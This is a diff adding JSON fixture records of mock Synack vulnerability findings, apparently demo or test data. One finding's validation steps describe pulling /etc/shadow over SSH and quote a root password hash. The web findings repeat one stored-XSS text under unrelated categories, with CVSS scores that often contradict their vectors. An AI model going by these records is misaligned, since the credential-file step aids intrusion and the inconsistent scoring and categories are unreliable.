+        "protocol": null,
+        "address": null,
+        "port": null
+      },
+      {
+        "type": "file",
+        "value": "/var/opt/rtm/shadow",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-30T00:00:00+00:00",
+    "resolved_at": "2023-10-13T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105852,
+      "codename": "SYNACK-DEMO-D001",
+      "slug": "demoes00001",
+      "category": "Hardware",
+      "link": "https://client.synack.com/assessments/demoes00001"
+    },
+    "validation_steps": [
+      {
+        "id": 119063,
+        "number": 1,
+        "detail": "Using any valid admin account, authenticate to the OmniPlexer R210 over SSH from two different devices.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119064,
+        "number": 2,
+        "detail": "Obtain the `/etc/passwd` and `/etc/shadow` file from these two different units. Both units contain the same root password hash: `root:$3$Sxh5sBs9.$5Sygi27jsS8bg/r3T/c/:4562:5:7432:15::: `",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119065,
+        "number": 3,
+        "detail": "Output of SSH configuration file also attached",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-d001-1"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-9",
+    "title": " #4",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Blind",
+      "parent": "SQL Injection"
+    },
+    "cvss_final": 10.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://example.com/admin/qceqwet",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-30T00:00:00+00:00",
+    "resolved_at": "2023-09-21T12:30:34+00:00",
+    "closed_at": "2023-10-09T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-9"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-1",
+    "title": " #0",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "File Inclusion",
+      "parent": "Remote Execution"
+    },
+    "cvss_final": 8.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Physical (P)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:P/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://example.com/api2/sjcbcs6",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-29T00:00:00+00:00",
+    "resolved_at": "2023-10-08T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-1"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-30",
+    "title": " #13",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Account Enumeration",
+      "parent": "Authentication/Session Management"
+    },
+    "cvss_final": 4.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:H",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://www.example.com/alert/vcaqo4y",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-27T00:00:00+00:00",
+    "resolved_at": "2022-10-22T12:30:35+00:00",
+    "closed_at": "2022-12-06T12:30:35+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-30"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-23",
+    "title": " #10",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Functionality Abuse with Malicious Impact",
+      "parent": "Functional/Business Logic"
+    },
+    "cvss_final": 2.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://www.example.com/admin/8tpmraz",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-26T00:00:00+00:00",
+    "resolved_at": "2023-07-20T12:30:34+00:00",
+    "closed_at": "2023-08-25T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-23"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-40",
+    "title": " #19",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Directory Structure Enumeration",
+      "parent": "Information Disclosure"
+    },
+    "cvss_final": 3.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:H",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://client.example.com/mysecrets/ual0n78",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-25T00:00:00+00:00",
+    "resolved_at": "2023-07-08T12:30:34+00:00",
+    "closed_at": "2023-08-15T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-40"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-38",
+    "title": " #18",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "HTTP Response Splitting (CRLF Injection)",
+      "parent": "Content Injection"
+    },
+    "cvss_final": 6.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://client.example.com/api2/c05n386",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-24T00:00:00+00:00",
+    "resolved_at": "2023-09-27T12:30:34+00:00",
+    "closed_at": "2023-10-15T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-38"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-48",
+    "title": " #21",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "File Inclusion",
+      "parent": "Remote Execution"
+    },
+    "cvss_final": 5.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://staging.example.com/api/j7l8miv",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-23T00:00:00+00:00",
+    "resolved_at": "2023-08-09T12:30:34+00:00",
+    "closed_at": "2023-09-14T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-48"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-56",
+    "title": " #23",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "SSO Authentication Bypass",
+      "parent": "Authentication/Session Management"
+    },
+    "cvss_final": 1.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://staging.example.com/products/vt4e4fn",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-23T00:00:00+00:00",
+    "resolved_at": "2023-07-11T12:30:34+00:00",
+    "closed_at": "2023-08-15T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-56"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-6",
+    "title": " #3",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Path Traversal",
+      "parent": "Authorization/Permissions"
+    },
+    "cvss_final": 9.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Local (L)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:H",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://example.com/plaintxtpwds/lrca1tu",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-21T00:00:00+00:00",
+    "resolved_at": "2022-10-12T12:30:35+00:00",
+    "closed_at": "2022-11-22T12:30:35+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-6"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-49",
+    "title": " #22",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "File Inclusion",
+      "parent": "Remote Execution"
+    },
+    "cvss_final": 7.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Physical (P)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:P/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://staging.example.com/api/cvyfztw",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-19T00:00:00+00:00",
+    "resolved_at": "2023-09-27T12:30:34+00:00",
+    "closed_at": "2023-10-12T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-49"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-36",
+    "title": " #17",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Functionality Abuse with Malicious Impact",
+      "parent": "Functional/Business Logic"
+    },
+    "cvss_final": 8.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
